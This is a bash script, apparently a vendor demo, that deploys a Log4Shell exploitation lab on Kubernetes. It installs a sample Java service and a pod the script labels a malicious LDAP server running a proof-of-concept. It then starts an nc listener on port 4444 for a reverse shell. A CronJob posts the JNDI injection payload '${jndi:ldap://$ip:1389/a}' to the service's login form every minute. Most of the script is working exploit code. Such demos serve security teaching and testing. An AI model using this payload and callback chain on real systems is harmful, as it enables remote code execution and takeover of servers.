#!/bin/bash

#function to deploy log4j and necessary components
log4j_deploy() {

  ns_val="java-ms-poc"

  if [[ -z $(kubectl get ns | grep $ns_val) ]]
  then
      tput bold setaf 2; echo "Creating $ns_val namespace. Please wait..."
      kubectl create ns $ns_val
  fi
  echo
  tput bold setaf 2; echo "Deploying a sample Java microservice on namespace '$ns_val'..."
  echo
  kubectl -n $ns_val apply -f https://raw.githubusercontent.com/accuknox/samples/main/log4j-demo/k8s.yaml
  sleep 2
  echo
  tput bold setaf 2; echo "Deploying malicious ldap server on namespace '$ns_val'..."
  echo
cat << eof | kubectl -n $ns_val apply -f-
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: nc-pod
  name: nc-pod
spec:
  selector:
    matchLabels:
      app: nc-pod
  template:
    metadata:
      labels:
        app: nc-pod
    spec:
      containers:
      - name: nc-pod
        image: knoxuser/nc-pod
---
apiVersion: v1
kind: Service
metadata:
  labels:
    app: nc-pod
  name: nc-svc
spec:
  ports:
  - name: "4444"
    port: 4444
    protocol: TCP
    targetPort: 4444
  - name: "8000"
    port: 8000
    protocol: TCP
    targetPort: 8000
  - name: "1389"
    port: 1389
    protocol: TCP
    targetPort: 1389
  selector:
    app: nc-pod
  type: LoadBalancer
status:
  loadBalancer: {}
eof

  sleep 2
  echo
  echo "Waiting for pods to be ready."

#  while [[ "$(kubectl -n $ns_val get pods -l=app=nc-pod -o jsonpath='{.items[*].status.containerStatuses[0].ready}')" != "true" && "$(kubectl -n $ns_val get pods -l=app=java-ms -o jsonpath='{.items[*].status.containerStatuses[0].ready}')" != "true" ]]; do
#     sleep 5
#  done

  while true
  do
     if [[ -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i terminating) && -z $(kubectl get svc -n $ns_val | awk '{print $4}' | grep -i pending) && ! -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i running) && -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i containercreating) && -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i pending) && -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i err) && -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i terminating) ]]
     then
        break
     fi
  done

  ip=`kubectl get svc -n $ns_val | grep nc-svc | awk '{print $4}'`
  ip_val=`kubectl get svc -n $ns_val | grep java-ms-svc | awk '{print $4}'`
  echo
  tput bold setaf 2; echo "Making the ldap server up and running.."
  echo

  exec_function() {

    kubectl -n $ns_val exec -i $2 -- $1 2>&1
    echo
  }

  nc_function() {

    kubectl -n $ns_val exec -it $2 -- $1 
    echo
  }

  pod_name=$(kubectl -n $ns_val get po -lapp=nc-pod -o name | cut -d/ -f2)
  exec_function 'python3 poc.py --userip '$ip' --webport 8000 --lport 4444' $pod_name &

  sleep 30

  echo
  tput bold setaf 2; echo "Please use use the following command to listen to bind reverse shell"
  echo "kubectl -n $ns_val exec -it $pod_name -- nc -lvnp 4444"
  echo
  sleep 10
  tput bold setaf 2; echo "Creating CronJob Please wait..."
  cat << eof | kubectl -n $ns_val apply -f-
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cron-logj4
spec:
  schedule: "*/1 * * * *"
  successfulJobsHistoryLimit: 0
  failedJobsHistoryLimit: 0
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
           app: java-ms
        spec:
          containers:
          - name: alpine-curl
            image: knoxuser/alpine-curl
            imagePullPolicy: IfNotPresent
            command:
            - /bin/sh
            - -c 
            - curl --connect-timeout 30 -no-keepalive --max-time 30 -d "uname=\\\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login
          restartPolicy: Never
eof


}


#function to remove all components deployed during installation phase
log4j_remove() {

  ns_val="java-ms-poc"

  tput bold setaf 2; echo "Removing CronJob. Please wait.."
  echo
  cat << eof | kubectl -n $ns_val delete -f-
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cron-logj4
spec:
  schedule: "*/1 * * * *"
  successfulJobsHistoryLimit: 0
  failedJobsHistoryLimit: 0
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
           app: java-ms
        spec:
          containers:
          - name: alpine-curl
            image: knoxuser/alpine-curl
            imagePullPolicy: IfNotPresent
            command:
            - /bin/sh
            - -c
            - curl --connect-timeout 30 -no-keepalive --max-time 30 -d "uname=\\\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login
          restartPolicy: Never
eof

  echo
  tput bold setaf 2; echo "Removing malicious ldap server from namespace '$ns_val'..."
  echo
  cat << eof | kubectl -n $ns_val delete -f-
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: nc-pod
  name: nc-pod
spec:
  selector:
    matchLabels:
      app: nc-pod
  template:
    metadata:
      labels:
        app: nc-pod
    spec:
      containers:
      - name: nc-pod
        image: knoxuser/nc-pod
---
apiVersion: v1
kind: Service
metadata:
  labels:
    app: nc-pod
  name: nc-svc
spec:
  ports:
  - name: "4444"
    port: 4444
    protocol: TCP
    targetPort: 4444
  - name: "8000"
    port: 8000
    protocol: TCP
    targetPort: 8000
  - name: "1389"
    port: 1389
    protocol: TCP
    targetPort: 1389
  selector:
    app: nc-pod
  type: LoadBalancer
status:
  loadBalancer: {}

eof

  echo
  tput bold setaf 2; echo "Removing sample Java microservice from namespace '$ns_val'..."
  echo
  kubectl -n $ns_val delete -f https://raw.githubusercontent.com/accuknox/samples/main/log4j-demo/k8s.yaml
  sleep 2

  echo
  tput bold setaf 2; echo "Deleting namespace '$ns_val'..."
  kubectl delete ns $ns_val
  echo

  echo
  tput bold setaf 2; echo "Successfully removed all components"
  echo
}


if [[ ( $1 == "install") ||  $1 == "Install" ||  $1 == "INSTALL" || $1 == "ins" || $1 == "" ]]
then

  log4j_deploy

elif [[ ( $1 == "delete") ||  $1 == "Delete" ||  $1 == "DELETE" ||  $1 == "del" ]]
then

  log4j_remove

else

  echo "Use $0 'ins'tall or $0 'del'ete"
fi
